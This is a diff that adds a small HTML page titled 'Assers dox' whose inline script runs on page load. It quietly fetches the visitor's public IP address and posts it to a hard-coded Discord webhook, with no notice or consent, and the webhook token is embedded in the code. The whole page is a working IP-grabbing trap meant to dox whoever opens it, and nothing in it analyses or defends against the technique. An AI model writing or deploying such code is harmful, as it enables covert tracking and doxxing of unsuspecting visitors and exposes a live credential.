@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Assers dox</title>
+</head>
+<body>
+    <h1>you fool</h1>
+
+    <script>
+        (async () => {
+            try {
+                // Fetch the user's IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+
+                // Prepare the data to be sent
+                const payload = {
+                    content: `User's IP Address: ${userIp}`
+                };
+
+                // Send the data to the webhook
+                await fetch('https://discord.com/api/webhooks/1264673420117803018/MVlqe0O3pDhz_qMDvYYZrMjZ-5xhEIK0a7GPZshh9SPuqAC4KovLOlv4bJ7T356M-D7f', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('Data sent successfully!');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        })();
+    </script>
+</body>
+</html>
